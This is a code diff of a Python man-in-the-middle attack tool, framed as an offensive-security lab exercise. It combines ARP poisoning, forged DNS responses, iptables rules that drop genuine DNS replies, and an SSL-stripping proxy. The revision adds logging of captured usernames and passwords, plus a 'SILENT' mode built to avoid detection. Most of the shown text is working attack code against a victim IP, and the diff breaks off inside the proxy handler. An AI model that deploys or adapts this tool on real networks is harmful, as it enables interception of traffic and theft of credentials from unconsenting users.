@@ -1,750 +1,898 @@
-from scapy.all import *
-import threading
-import time
-import os
-import signal
-import sys
-from http.server import HTTPServer, BaseHTTPRequestHandler
-import urllib.request
-import urllib.parse
-import ssl
-import re
-from collections import defaultdict
-from datetime import datetime
-import argparse
-import ipaddress
+# =============================================================================
+# MITM Attack Tool - Lab on Offensive Cyber Security
+# =============================================================================
+# This tool performs a Man-in-the-Middle attack combining:
+# 1. ARP Poisoning - To intercept traffic between victim and gateway
+# 2. DNS Spoofing - To redirect victim's DNS queries to attacker
+# 3. SSL Stripping - To downgrade HTTPS connections to HTTP
+# =============================================================================
 
-# CONFIGURATION (ATTACKER MUST SET THESE)
+# Scapy library for crafting and sending network packets (ARP, DNS, etc.)
+from scapy.all import *
+import threading          # For running multiple attack components simultaneously
+import time               # For sleep intervals between ARP packets
+import os                 # For system commands (iptables, IP forwarding)
+import signal             # For handling Ctrl+C gracefully
+import sys                # For system exit and command line args
+from http.server import HTTPServer, BaseHTTPRequestHandler  # For SSL strip proxy
+import urllib.request     # For URL handling
+import urllib.parse       # For parsing URLs and POST data
+import urllib.error       # For handling URL errors
+import ssl                # For creating SSL contexts (HTTPS connections)
+import re                 # For regex pattern matching (credentials, HTTPS links)
+from collections import defaultdict  # For tracking stripped links
+from datetime import datetime  # For timestamps in logs
+import argparse           # For parsing command line arguments
+import ipaddress          # For IP address validation and network calculations
+import socket             # For low-level network operations
+import traceback          # For detailed error messages
+import dns.resolver       # For resolving real IPs via upstream DNS (bypasses our spoof)
+import http.client        # For making HTTP/HTTPS connections to real servers
+
+# =============================================================================
+# CONFIGURATION
+# =============================================================================
+# Global configuration dictionary storing attack parameters
 CONFIG = {
-    # Network Settings
-    "ATTACKER_IP": None,
-    "INTERFACE": None,
-    "VICTIM_IP": None,
-    
-    # Operational Mode: "SILENT" or "ALL_OUT"
-    # SILENT  = Targeted DNS spoofing (SPOOF_MAP only), Slow ARP (Stealthy)
-    # ALL_OUT = Spoof ALL DNS requests, Fast ARP (Aggressive/Noisy)
-    "MODE": None
+    "ATTACKER_IP": None,   # IP address of the attacker machine
+    "INTERFACE": None,     # Network interface to use (e.g., wlp0s20f3, eth0)
+    "VICTIM_IP": None,     # IP address of the target victim
+    "MODE": None           # Attack mode: SILENT (targeted) or ALL_OUT (aggressive)
 }
 
-# DNS Spoofing Map (Used primarily in SILENT mode)
+# DNS spoofing map: domain -> IP to redirect to (used in SILENT mode)
 SPOOF_MAP = {}
 
+# =============================================================================
 # GLOBAL VARIABLES FOR NETWORK STATE
-VICTIM_MAC = None
-GATEWAY_IP = None
-GATEWAY_MAC = None
+# =============================================================================
+VICTIM_MAC = None          # MAC address of the victim (discovered via ARP)
+GATEWAY_IP = None          # IP address of the network gateway/router
+GATEWAY_MAC = None         # MAC address of the gateway (discovered via ARP)
+STOP_ATTACK = False        # Flag to signal all threads to stop
+UPSTREAM_DNS = "8.8.8.8"   # Google's DNS - used to resolve real IPs for proxy
 
-STOP_ATTACK = False
-
+# =============================================================================
 # SSL STRIPPING CONFIGURATION
-SSL_STRIP_PORT = 8080
-ssl_strip_server = None
-http_to_https_map = {}
+# =============================================================================
+SSL_STRIP_PORT = 8080      # Port where our SSL stripping proxy listens
+ssl_strip_server = None    # Reference to the HTTP server instance
+http_to_https_map = {}     # Cache: maps HTTP URLs to their HTTPS equivalents
+real_ip_cache = {}         # Cache: maps hostnames to their real IP addresses
+captured_credentials = []  # List storing all captured username/password pairs
 
-
+# =============================================================================
 # ANALYSIS DATA STRUCTURES
+# =============================================================================
+# This class tracks and analyzes the effectiveness of SSL stripping
+# It monitors HSTS headers, cookies, and HTTP->HTTPS upgrades
 class SSLStripAnalyzer:
-    """Tracks and analyzes SSL stripping feasibility and modern defenses."""
-    
     def __init__(self):
-        self.http_requests = []  # Track all HTTP requests
-        self.https_upgrades = []  # Track HTTP→HTTPS redirects (the "bridge")
-        self.hsts_detections = {}  # Track HSTS headers by domain
-        self.cookie_analysis = []  # Track cookies and their security attributes
-        self.direct_https = []  # Track direct HTTPS attempts (HSTS preload indicator)
-        self.stripped_links = defaultdict(int)  # Count HTTPS→HTTP rewrites
+        self.http_requests = []           # All HTTP requests seen
+        self.https_upgrades = []          # HTTP->HTTPS redirects (the "bridge" moment)
+        self.hsts_detections = {}         # Sites that sent HSTS headers
+        self.cookie_analysis = []         # Cookies and their security attributes
+        self.direct_https = []            # Direct HTTPS attempts (HSTS preload)
+        self.stripped_links = defaultdict(int)  # Count of HTTPS links stripped
+        self.credentials_captured = []    # Credentials found in POST data
         self.attack_effectiveness = {
-            'vulnerable_sites': [],  # Sites without HSTS that could be stripped
-            'hsts_protected': [],  # Sites protected by HSTS
-            'preload_protected': [],  # Sites with HSTS preload (direct HTTPS)
-            'secure_cookies': [],  # Sites using Secure cookie attribute
+            'vulnerable_sites': [],       # Sites without HSTS protection
+            'hsts_protected': [],         # Sites protected by HSTS
+            'preload_protected': [],      # Sites in browser's HSTS preload list
+            'secure_cookies': [],         # Sites using Secure cookie flag
         }
     
+    # Log an HTTP request - every HTTP request is a potential stripping opportunity
     def log_http_request(self, host, path, method):
-        """Log HTTP request - potential stripping opportunity."""
         entry = {
             'timestamp': datetime.now().strftime('%H:%M:%S'),
-            'host': host,
-            'path': path,
-            'method': method,
-            'protocol': 'HTTP'
+            'host': host, 'path': path, 'method': method, 'protocol': 'HTTP'
         }
         self.http_requests.append(entry)
         print(f"[Analyzer] HTTP Request: {method} {host}{path}")
     
+    # Log HTTP->HTTPS redirect - this is the critical "t0" moment where stripping works
+    # At this moment, the victim requested HTTP and server wants to upgrade to HTTPS
+    # Our proxy intercepts this and keeps the victim on HTTP
     def log_https_upgrade(self, from_url, to_url, status_code):
-        """Log HTTP→HTTPS redirect - the critical 'bridge' moment."""
         entry = {
             'timestamp': datetime.now().strftime('%H:%M:%S'),
-            'from': from_url,
-            'to': to_url,
-            'status': status_code,
+            'from': from_url, 'to': to_url, 'status': status_code,
             'type': 'HTTP→HTTPS Bridge'
         }
         self.https_upgrades.append(entry)
-        print(f"\n[Analyzer]  CRITICAL: HTTP→HTTPS BRIDGE DETECTED!")
-        print(f"[Analyzer] From: {from_url}")
-        print(f"[Analyzer] To: {to_url}")
-        print(f"[Analyzer] Status: {status_code}")
-        print(f"[Analyzer] This is the t0 moment - stripping COULD work here\n")
+        print(f"\n[Analyzer] ⚠ CRITICAL: HTTP→HTTPS BRIDGE DETECTED!")
+        print(f"[Analyzer]   From: {from_url}")
+        print(f"[Analyzer]   To: {to_url}")
+        print(f"[Analyzer]   Status: {status_code}\n")
     
+    # Log HSTS header detection - HSTS tells browsers to always use HTTPS
+    # Once a browser sees this header, it will never make HTTP requests to this domain
     def log_hsts(self, domain, hsts_header):
-        """Log HSTS header detection."""
         self.hsts_detections[domain] = {
             'timestamp': datetime.now().strftime('%H:%M:%S'),
             'header': hsts_header,
             'max_age': self._parse_max_age(hsts_header)
         }
-        print(f"[Analyzer]  HSTS Detected on {domain}")
-        print(f"[Analyzer] Header: {hsts_header}")
-        print(f"[Analyzer] Impact: Future requests will skip HTTP entirely\n")
-        
+        print(f"[Analyzer] HSTS Detected on {domain}")
         if domain not in self.attack_effectiveness['hsts_protected']:
             self.attack_effectiveness['hsts_protected'].append(domain)
     
+    # Log cookie security attributes
+    # Secure flag: cookie only sent over HTTPS (protects against our attack)
+    # HttpOnly flag: cookie not accessible via JavaScript (protects against XSS)
     def log_cookie(self, domain, cookie_name, has_secure, has_httponly):
-        """Log cookie and analyze security attributes."""
         entry = {
             'timestamp': datetime.now().strftime('%H:%M:%S'),
-            'domain': domain,
-            'name': cookie_name,
-            'secure': has_secure,
-            'httponly': has_httponly
+            'domain': domain, 'name': cookie_name,
+            'secure': has_secure, 'httponly': has_httponly
         }
         self.cookie_analysis.append(entry)
-        
-        if has_secure:
-            print(f"[Analyzer]  Secure Cookie: {cookie_name} on {domain}")
-            print(f"[Analyzer] Impact: Cookie will NOT be sent over HTTP (protected)\n")
-            if domain not in self.attack_effectiveness['secure_cookies']:
-                self.attack_effectiveness['secure_cookies'].append(domain)
-        else:
-            print(f"[Analyzer]   Insecure Cookie: {cookie_name} on {domain}")
-            print(f"[Analyzer] Impact: Cookie WOULD be exposed over HTTP\n")
+        if has_secure and domain not in self.attack_effectiveness['secure_cookies']:
+            self.attack_effectiveness['secure_cookies'].append(domain)
     
+    # Log direct HTTPS connection attempt (CONNECT method)
+    # This happens when browser tries HTTPS directly - likely HSTS preload
+    # We cannot strip these - the browser never made an HTTP request
     def log_direct_https(self, host):
-        """Log direct HTTPS attempt (likely HSTS preload)."""
-        self.direct_https.append({
-            'timestamp': datetime.now().strftime('%H:%M:%S'),
-            'host': host
-        })
-        print(f"[Analyzer]  Direct HTTPS: {host}")
-        print(f"[Analyzer] Likely HSTS Preload - no HTTP 'bridge' exists\n")
-        
+        self.direct_https.append({'timestamp': datetime.now().strftime('%H:%M:%S'), 'host': host})
+        print(f"[Analyzer] Direct HTTPS: {host} - Likely HSTS Preload")
         if host not in self.attack_effectiveness['preload_protected']:
             self.attack_effectiveness['preload_protected'].append(host)
     
+    # Track each HTTPS link we strip from page content
     def log_link_strip(self, url):
-        """Track when we strip HTTPS→HTTP in content."""
         self.stripped_links[url] += 1
     
+    # Log captured credentials from POST data
+    def log_credentials(self, host, data):
+        entry = {'timestamp': datetime.now().strftime('%H:%M:%S'), 'host': host, 'data': data[:500]}
+        self.credentials_captured.append(entry)
+    
+    # Extract max-age value from HSTS header
+    # max-age determines how long browser remembers to use HTTPS
     def _parse_max_age(self, hsts_header):
-        """Extract max-age from HSTS header."""
         match = re.search(r'max-age=(\d+)', hsts_header)
         return int(match.group(1)) if match else 0
     
+    # Generate comprehensive report at the end of the attack
     def generate_report(self):
-        """Generate comprehensive analysis report."""
         print("\n" + "="*80)
-        print("SSL STRIPPING FEASIBILITY ANALYSIS REPORT")
+        print("                 SSL STRIPPING FEASIBILITY ANALYSIS REPORT")
         print("="*80)
         
         print(f"\n TRAFFIC SUMMARY:")
-        print(f"  • Total HTTP requests: {len(self.http_requests)}")
-        print(f"  • HTTP→HTTPS upgrades detected: {len(self.https_upgrades)}")
-        print(f"  • Direct HTTPS attempts: {len(self.direct_https)}")
-        print(f"  • HTTPS links stripped: {sum(self.stripped_links.values())}")
+        print(f"   • Total HTTP requests: {len(self.http_requests)}")
+        print(f"   • HTTP→HTTPS upgrades detected: {len(self.https_upgrades)}")
+        print(f"   • Direct HTTPS attempts: {len(self.direct_https)}")
+        print(f"   • HTTPS links stripped: {sum(self.stripped_links.values())}")
         
+        # Show the "bridge" moments - where SSL stripping could intercept
         print(f"\n CRITICAL 'BRIDGE' MOMENTS (t0 - where attack could work):")
         if self.https_upgrades:
             for upgrade in self.https_upgrades:
-                print(f"  • {upgrade['timestamp']}: {upgrade['from']} → {upgrade['to']}")
-                print(f"    Status: {upgrade['status']} (Redirect)")
+                print(f"   • {upgrade['timestamp']}: {upgrade['from']} → {upgrade['to']}")
         else:
-            print(f"  • None detected - no stripping opportunities found")
+            print(f"   • None detected")
         
         print(f"\n HSTS PROTECTION ANALYSIS:")
         if self.hsts_detections:
             for domain, data in self.hsts_detections.items():
-                max_age_days = data['max_age'] / 86400
-                print(f"  • {domain}:")
-                print(f"    - Max-Age: {max_age_days:.1f} days")
-                print(f"    - Effect: Browser will enforce HTTPS for this duration")
+                print(f"   • {domain}: Max-Age={data['max_age']/86400:.1f} days")
         else:
-            print(f"  • No HSTS headers detected")
+            print(f"   • No HSTS headers detected")
         
-        print(f"\n COOKIE SECURITY ANALYSIS:")
-        secure_count = sum(1 for c in self.cookie_analysis if c['secure'])
-        insecure_count = sum(1 for c in self.cookie_analysis if not c['secure'])
-        print(f"  • Secure cookies (protected): {secure_count}")
-        print(f"  • Insecure cookies (vulnerable): {insecure_count}")
-        
-        if insecure_count > 0:
-            print(f"\n    Insecure cookies that COULD be stolen via HTTP:")
-            for cookie in self.cookie_analysis:
-                if not cookie['secure']:
-                    print(f"    - {cookie['name']} on {cookie['domain']}")
-        
-        print(f"\n ATTACK EFFECTIVENESS ASSESSMENT:")
-        print(f"  • Vulnerable sites (no HSTS, had HTTP bridge): "
-              f"{len([u for u in self.https_upgrades if u['from'].split('/')[2] not in self.hsts_detections])}")
-        print(f"  • HSTS-protected sites: {len(self.attack_effectiveness['hsts_protected'])}")
-        print(f"  • Preload-protected sites: {len(self.attack_effectiveness['preload_protected'])}")
-        print(f"  • Sites using Secure cookies: {len(self.attack_effectiveness['secure_cookies'])}")
-        
-        print(f"\n KEY FINDINGS:")
-        if self.https_upgrades and not self.hsts_detections:
-            print(f"  ✓ Attack COULD be effective - HTTP→HTTPS bridge exists without HSTS")
-        elif self.https_upgrades and self.hsts_detections:
-            print(f"   Attack might work ONCE, but HSTS prevents future attempts")
-        elif self.direct_https:
-            print(f"  ✗ Attack FAILS - sites using HSTS preload (no HTTP bridge)")
+        print(f"\n CAPTURED CREDENTIALS:")
+        if captured_credentials:
+            for cred in captured_credentials:
+                print(f"   • {cred['timestamp']} - {cred['host']}")
+                print(f"     👤 Username: {cred.get('username', 'N/A')}")
+                print(f"     🔑 Password: {cred.get('password', 'N/A')}")
         else:
-            print(f"  ? Insufficient data - need more traffic to analyze")
+            print(f"   • No credentials captured")
         
-        print(f"\n MODERN DEFENSE MECHANISMS OBSERVED:")
-        mechanisms = []
-        if self.hsts_detections:
-            mechanisms.append("HSTS (HTTP Strict Transport Security)")
-        if self.attack_effectiveness['preload_protected']:
-            mechanisms.append("HSTS Preload Lists")
-        if self.attack_effectiveness['secure_cookies']:
-            mechanisms.append("Secure Cookie Attribute")
-        if self.direct_https:
-            mechanisms.append("Browser HTTPS Enforcement")
-        
-        if mechanisms:
-            for mech in mechanisms:
-                print(f"  • {mech}")
-        else:
-            print(f"  • None detected (site may be vulnerable)")
-        
+        print(f"\n ATTACK EFFECTIVENESS:")
+        print(f"   • HSTS-protected sites: {len(self.attack_effectiveness['hsts_protected'])}")
+        print(f"   • Preload-protected sites: {len(self.attack_effectiveness['preload_protected'])}")
         print("\n" + "="*80 + "\n")
 
-# Initialize analyzer
+# Create global analyzer instance
 analyzer = SSLStripAnalyzer()
-# IPTABLES MANAGEMENT
 
-def manage_iptables(action):
-    """
-    Adds or deletes the crucial iptables rule to drop the genuine DNS response.
-    Action should be 'A' (Add) or 'D' (Delete).
-    """
-
-    if action not in ['A', 'D']:
-        print("[!] Invalid action for iptables management. Use 'A' to add or 'D' to delete.")
-        return
+# =============================================================================
+# DNS RESOLUTION FOR PROXY
+# =============================================================================
+# This function resolves the REAL IP of a hostname using upstream DNS (8.8.8.8)
+# This is critical because our DNS spoof redirects all queries to attacker
+# But the proxy needs to know the real IP to fetch actual content
+def resolve_real_ip(hostname):
+    global real_ip_cache
     
-    # Rule: Drop packets coming FROM the Gateway (DNS Server) to the Victim on UDP port 53
-    iptables_command = (
-        f"sudo iptables -{action} FORWARD -p udp -s {GATEWAY_IP} --sport 53 "
-        f"-d {CONFIG['VICTIM_IP']} -j DROP"
-    )
-    print(f"[{action}] Executing IPTables command: {iptables_command}")
-    os.system(iptables_command)
-
-# ARP FUNCTIONS
-
-def find_gateway():
-    """Finds the gateway IP using the system's routing table."""
-    # Use random IP outside the network to trace the route to the gateway
-    random_IP = "123.123.123.000"
-    return conf.route.route(random_IP)[2]
-
-def find_mac(target_IP):
-    """Finds the MAC address for a given IP using ARP Request."""
-    broadcast = "ff:ff:ff:ff:ff:ff"
-
-    # send ARP request to victim for MAC address
-    arp_request = Ether(dst=broadcast)/ARP(pdst=target_IP)
-    answered, unanswered = srp(arp_request, timeout=2, verbose=False)
+    # Check cache first to avoid repeated DNS lookups
+    if hostname in real_ip_cache:
+        return real_ip_cache[hostname]
     
-    for sent, received in answered:
-        if received.psrc == target_IP:
-            return received.hwsrc
+    # Check if hostname is already an IP address (e.g., 192.168.1.1)
+    # If so, no DNS resolution needed - return it directly
+    try:
+        ipaddress.ip_address(hostname)
+        print(f"[SSL Strip] {hostname} is already an IP address")
+        real_ip_cache[hostname] = hostname
+        return hostname
+    except ValueError:
+        pass  # Not an IP address, continue with DNS resolution
+    
+    # Skip invalid or local hostnames
+    if '.' not in hostname or hostname in ['localhost', 'wpad', 'wpad.home']:
+        return None
+    
+    try:
+        # Create DNS resolver that queries upstream DNS directly
+        # This bypasses our own DNS spoof so we get the real IP
+        resolver = dns.resolver.Resolver()
+        resolver.nameservers = [UPSTREAM_DNS]  # Use Google DNS
+        resolver.timeout = 5
+        resolver.lifetime = 5
+        
+        # Resolve the A record (IPv4 address)
+        answers = resolver.resolve(hostname, 'A')
+        if answers:
+            real_ip = str(answers[0])
+            real_ip_cache[hostname] = real_ip
+            print(f"[SSL Strip] Resolved {hostname} -> {real_ip}")
+            return real_ip
+    except dns.resolver.NXDOMAIN:
+        # Domain doesn't exist - might be a fake domain for phishing
+        print(f"[SSL Strip] Domain {hostname} not found - using local server")
+    except Exception as e:
+        print(f"[SSL Strip] DNS error for {hostname}: {e}")
     return None
 
+# =============================================================================
+# IPTABLES MANAGEMENT
+# =============================================================================
+# This function manages iptables rules for DNS response dropping
+# We need to drop legitimate DNS responses from the gateway so our
+# spoofed responses arrive first and are accepted by the victim
+def manage_iptables(action):
+    if action not in ['A', 'D']:  # A = Add rule, D = Delete rule
+        return
+    # Rule: Drop UDP packets from gateway (DNS server) on port 53 to victim
+    # This ensures our spoofed DNS response wins the race
+    cmd = f"sudo iptables -{action} FORWARD -p udp -s {GATEWAY_IP} --sport 53 -d {CONFIG['VICTIM_IP']} -j DROP"
+    print(f"[{action}] IPTables: {cmd}")
+    os.system(cmd)
+
+# =============================================================================
+# ARP FUNCTIONS
+# =============================================================================
+# Find the gateway IP by checking the routing table
+# Routes packets to a random external IP and sees which gateway is used
+def find_gateway():
+    return conf.route.route("123.123.123.000")[2]
+
+# Find MAC address of a given IP using ARP request
+# Sends broadcast ARP "who-has" and waits for reply
+def find_mac(target_IP):
+    # Create ARP request packet: broadcast Ethernet + ARP query
+    arp_request = Ether(dst="ff:ff:ff:ff:ff:ff")/ARP(pdst=target_IP)
+    # Send packet and wait for response (srp = send/receive at layer 2)
+    answered, _ = srp(arp_request, timeout=2, verbose=False)
+    for sent, received in answered:
+        if received.psrc == target_IP:
+            return received.hwsrc  # Return the MAC address
+    return None
+
+# Restore legitimate ARP entries after attack ends
+# Sends correct ARP replies to both victim and gateway
 def restore_arp(victim_ip, gateway_ip, victim_mac, gateway_mac):
-    """Restores the correct ARP cache on the victim and gateway."""
-    # Build a genuine ARP reply for the victim
+    # Tell victim: gateway's IP is at gateway's real MAC
     victim_restore = Ether(src=gateway_mac, dst=victim_mac)/ARP(op="is-at", psrc=gateway_ip, pdst=victim_ip, hwsrc=gateway_mac)
-    
-    # Build a genuine ARP reply for the gateway
+    # Tell gateway: victim's IP is at victim's real MAC
     gateway_restore = Ether(src=victim_mac, dst=gateway_mac)/ARP(op="is-at", psrc=victim_ip, pdst=gateway_ip, hwsrc=victim_mac)
-    
-    # Send a few times to ensure the cache is restored
+    # Send multiple times to ensure it sticks
     sendp(victim_restore, count=5, iface=CONFIG["INTERFACE"], verbose=False)
     sendp(gateway_restore, count=5, iface=CONFIG["INTERFACE"], verbose=False)
-    print("[ARP Poison] ARP tables restored successfully.")
+    print("[ARP Poison] ARP tables restored.")
 
+# Main ARP poisoning loop - runs continuously in a thread
+# Sends forged ARP replies to maintain our position in the middle
 def arp_poison_loop(victim_ip, gateway_ip, victim_mac, gateway_mac):
-    """Continuously sends forged ARP packets to maintain the poison."""
-    
-    # Forge ARP packets to victim pretending to be the gateway
-    # hwsrc is automatically set to the MAC of the attacker.
-    
-    # Forge ARP packets to victim pretending to be the gateway
+    # Packet to victim: "I am the gateway" (attacker's MAC, gateway's IP)
     victim_packet = Ether(dst=victim_mac)/ARP(op="is-at", psrc=gateway_ip, pdst=victim_ip, hwdst=victim_mac)
-    # Forge ARP packet to gateway pretending to be the victim. 
+    # Packet to gateway: "I am the victim" (attacker's MAC, victim's IP)
     gateway_packet = Ether(dst=gateway_mac)/ARP(op="is-at", psrc=victim_ip, pdst=gateway_ip, hwdst=gateway_mac)
-
-    # --- IMPLEMENTING OPERATIONAL MODES ---
-    # SILENT: Sleep 4s (Harder to detect)
-    # ALL_OUT: Sleep 0.5s (Ensures poison sticks, risking detection)
+    
+    # SILENT mode: slower (4s) to avoid detection
+    # ALL_OUT mode: faster (0.5s) to ensure poison sticks
     sleep_interval = 4 if CONFIG["MODE"] == "SILENT" else 0.5
-
     global STOP_ATTACK
+    
+    # Keep sending until attack is stopped
     while not STOP_ATTACK:
         try:
             sendp(victim_packet, iface=CONFIG["INTERFACE"], verbose=False)
             sendp(gateway_packet, iface=CONFIG["INTERFACE"], verbose=False)
-            time.sleep(sleep_interval) # Send every couple of seconds to maintain the poison
-        except KeyboardInterrupt:
-            # If a direct interrupt is caught in this thread, set the flag and break
-            STOP_ATTACK = True
-            break                                   
+            time.sleep(sleep_interval)
+        except:
+            break
 
-
+# =============================================================================
 # DNS FUNCTIONS
-
+# =============================================================================
+# Handler for sniffed DNS packets - decides whether to spoof each query
 def dns_handler(packet):
-    """Handles sniffed DNS packets and attempts to spoof queries."""
-
-    print(f"[DNS Spoof] Received a packet from: {packet[IP].src}")
-
-    if not packet.haslayer(DNS):
-        # Ignore non-DNS packets
-        print("[DNS Spoof] Packet does not have DNS layer. Ignoring.")
-        return
+    global STOP_ATTACK
     
-    if packet[DNS].qr != 0:
-        # Ignore DNS responses
-        print(f"[DNS Spoof] Packet is a DNS RESPONSE (qr={packet[DNS].qr}). Ignoring.")
+    # Ignore if attack stopped, not DNS, not a query, or from ourselves
+    if STOP_ATTACK or not packet.haslayer(DNS) or packet[DNS].qr != 0 or not packet.haslayer(DNSQR):
         return
-
-    if not packet.haslayer(DNSQR):
-        print("[DNS Spoof] Query packet is missing DNSQR layer. Ignoring.")
-        return
+    if packet[IP].src == CONFIG["ATTACKER_IP"]:
+        return  # Don't spoof our own queries
     
-    print("[DNS Spoof] Packet is a DNS QUERY (qr=0). Proceeding.")
-
-    query_name_bytes = packet[DNSQR].qname
-
     try:
-        query_name = query_name_bytes.decode('utf-8')
-    except UnicodeDecodeError:
-        print("[DNS Spoof] Could not decode query name.")
+        query_name = packet[DNSQR].qname.decode('utf-8')
+    except:
         return
-        
-    print(f"[DNS Spoof] Extracted Query Name: '{query_name}'")
-
-    # --- IMPLEMENTING OPERATIONAL MODES ---
+    
+    print(f"[DNS Spoof] Query: '{query_name}' from {packet[IP].src}")
+    
+    # Decide whether to spoof based on mode
     should_spoof = False
     spoof_ip = None
-
-    if CONFIG["MODE"] == "ALL_OUT":
-        # Spoof EVERYTHING 
-        # Redirect all traffic to Attacker IP
-        if packet[DNSQR].qtype == 1: # 1 = A Record
-            should_spoof = True
-            spoof_ip = CONFIG["ATTACKER_IP"] # Always redirect to Attacker
-            
-    elif CONFIG["MODE"] == "SILENT":
-        # Only spoof targets explicitly in the map
-        if query_name in SPOOF_MAP:
-            should_spoof = True
-            spoof_ip = SPOOF_MAP[query_name]
-
-    # --- EXECUTE SPOOF ---
-    if should_spoof:
-        print(f"[DNS Spoof ({CONFIG['MODE']})] Intercepted: {query_name} -> {spoof_ip}; FORGING REPLY...")
-
-        # Crafting the Spoofed Response
-
-        # Forge IP and UDP headers (Source and Destination IPs/Ports swapped)
-        spoofed_ip = IP(src=packet[IP].dst, dst=packet[IP].src) 
-        spoofed_udp = UDP(sport=packet[UDP].dport, dport=packet[UDP].sport) 
-
-        # Create the malicious Answer Record (DNSRR)
+    
+    if CONFIG["MODE"] == "ALL_OUT" and packet[DNSQR].qtype == 1:
+        # ALL_OUT: Spoof ALL A record queries, redirect to attacker
+        should_spoof = True
+        spoof_ip = CONFIG["ATTACKER_IP"]
+    elif CONFIG["MODE"] == "SILENT" and query_name in SPOOF_MAP:
+        # SILENT: Only spoof domains in our target list
+        should_spoof = True
+        spoof_ip = SPOOF_MAP[query_name]
+    
+    # Only spoof queries from the victim
+    if should_spoof and packet[IP].src == str(CONFIG["VICTIM_IP"]):
+        print(f"[DNS Spoof] SPOOFING: {query_name} -> {spoof_ip}")
+        
+        # Craft spoofed DNS response
+        # IP layer: swap source/destination (response goes back to victim)
+        spoofed_ip = IP(src=packet[IP].dst, dst=packet[IP].src)
+        # UDP layer: swap ports
+        spoofed_udp = UDP(sport=packet[UDP].dport, dport=packet[UDP].sport)
+        # DNS answer: the domain resolves to our attacker IP
         spoofed_answer = DNSRR(rrname=query_name, rdata=spoof_ip)
-
-        # Forge the DNS Response (must use the original TXID)
-        spoofed_dns = DNS(id=packet[DNS].id, qr=1, aa=1, rd=0, ra=0, qd=packet[DNSQR], an=spoofed_answer) 
+        # DNS response: must use same transaction ID as query
+        spoofed_dns = DNS(id=packet[DNS].id, qr=1, aa=1, rd=0, ra=0, qd=packet[DNSQR], an=spoofed_answer)
         
-        # Packing spoofed layers
-        final_packet = spoofed_ip / spoofed_udp / spoofed_dns
+        # Send the forged response
+        send(spoofed_ip/spoofed_udp/spoofed_dns, verbose=0)
 
-        # Send the forged packet
-        send(final_packet, verbose=0)
-        print(f"[DNS Spoof ({CONFIG['MODE']})] SENT SPOOFED REPLY: {query_name} -> {spoof_ip}")
-        
-    elif CONFIG["MODE"] == "SILENT":
-        # Only print ignored domains in silent mode for debugging
-        # In ALL_OUT, we spoof everything so this will be hit only in SILENT mode, when domain is not a target
-        print(f"[DNS Spoof ({CONFIG['MODE']})] Domain '{query_name}' NOT in SPOOF_MAP. Ignoring due to Silent Mode.")
-        
-
+# Callback to check if sniffing should stop
 def stop_sniffing(packet):
-    """Callback function for Scapy's sniff to check the global stop flag."""
-    global STOP_ATTACK
-    # This function returns True when the global flag is set, telling sniff() to exit.
     return STOP_ATTACK
 
+# Start DNS spoofing in a separate thread
 def start_dns_spoofing():
-    """Starts the continuous sniffing thread for DNS traffic."""
+    print(f"[DNS Spoof] Starting on {CONFIG['INTERFACE']}")
     
-    print(f"[DNS Spoof] Starting DNS sniffer on interface {CONFIG['INTERFACE']}")
+    def sniff_dns():
+        try:
+            # Sniff DNS packets to/from victim
+            sniff(iface=CONFIG["INTERFACE"], filter=f"udp and port 53 and host {CONFIG['VICTIM_IP']}",
+                  prn=dns_handler, store=0, stop_filter=stop_sniffing)
+        except:
+            pass
     
-    # The filter ensures we only catch UDP traffic on port 53 (DNS)
-    sniff_thread = threading.Thread(
-        target=sniff, 
-        kwargs={
-            'iface': CONFIG["INTERFACE"], 
-            'filter': "udp and port 53", 
-            'prn': dns_handler,
-            'store': 0, 
-            'stop_filter': stop_sniffing
-            }
-    )
-    return sniff_thread
+    thread = threading.Thread(target=sniff_dns)
+    thread.daemon = True
+    return thread
 
-# SSL STRIPPING 
+# =============================================================================
+# SSL STRIPPING - Connection Classes
+# =============================================================================
+# Custom HTTP connection that connects to a specific IP but sends original Host header
+# This is needed because we resolve the real IP ourselves (bypassing DNS)
+# but the server needs the correct Host header for virtual hosting
+class DirectIPHTTPConnection(http.client.HTTPConnection):
+    def __init__(self, real_ip, host, port=80, timeout=15):
+        # Connect to the real IP, not the hostname
+        super().__init__(real_ip, port, timeout=timeout)
+        self._real_host = host  # Store original hostname for Host header
+    
+    def putheader(self, header, *values):
+        # Override Host header with original hostname
+        if header.lower() == 'host':
+            values = (self._real_host,)
+        super().putheader(header, *values)
+
+# Same as above but for HTTPS connections
+class DirectIPHTTPSConnection(http.client.HTTPSConnection):
+    def __init__(self, real_ip, host, port=443, timeout=15, context=None):
+        super().__init__(real_ip, port, timeout=timeout, context=context)
+        self._real_host = host
+    
+    def putheader(self, header, *values):
+        if header.lower() == 'host':
+            values = (self._real_host,)
+        super().putheader(header, *values)
+
+# =============================================================================
+# SSL STRIPPING - Main Handler
+# =============================================================================
+# This is the core of SSL stripping - an HTTP proxy that:
+# 1. Receives HTTP requests from victim (redirected via iptables)
+# 2. Fetches content from real server (following HTTPS redirects)
+# 3. Returns content to victim over HTTP (stripping HTTPS)
+# 4. Rewrites all HTTPS links in content to HTTP
 class SSLStripHandler(BaseHTTPRequestHandler):
-    """
-    HTTP Proxy that demonstrates SSL stripping while analyzing defenses.
     
-    Key Concepts Demonstrated:
-    1. HTTP→HTTPS "bridge" moment (t0) - where attack could work
-    2. HSTS detection - modern defense mechanism
-    3. Secure cookie analysis - session protection
-    4. HSTS preload effects - no HTTP bridge exists
-    """
-    
+    # Suppress default HTTP server logging
     def log_message(self, format, *args):
-        """Suppress default logging."""
         pass
     
+    # Handle GET requests
     def do_GET(self):
-        """Handle GET requests."""
         self.handle_request('GET')
     
+    # Handle POST requests (important for capturing credentials)
     def do_POST(self):
-        """Handle POST requests."""
         self.handle_request('POST')
     
+    # Handle HEAD requests
+    def do_HEAD(self):
+        self.handle_request('HEAD')
+    
+    # Handle CONNECT requests (direct HTTPS attempts)
+    # This means browser is trying to establish HTTPS tunnel
+    # We cannot strip this - browser never made HTTP request
     def do_CONNECT(self):
-        """
-        Handle CONNECT method - indicates direct HTTPS attempt.
-        This shows HSTS preload or user typing https://
-        """
         host = self.path.split(':')[0]
         analyzer.log_direct_https(host)
-        self.send_error(502, "Direct HTTPS - HSTS Preload likely in effect")
+        print(f"[SSL Strip] ✗ CONNECT {host} - HSTS protected")
+        self.send_error(502, "HSTS protected")
     
+    # Main request handler for GET, POST, HEAD
     def handle_request(self, method):
-        """Core handler with analysis."""
-        url = self.path
-        host = self.headers.get('Host', '')
-        
-        # Log the HTTP request
-        analyzer.log_http_request(host, url if url.startswith('/') else url, method)
-        
-        # Construct full URL
-        if not url.startswith('http'):
-            url = f"http://{host}{url}"
-        
-        # Check mapping and upgrade to HTTPS for upstream
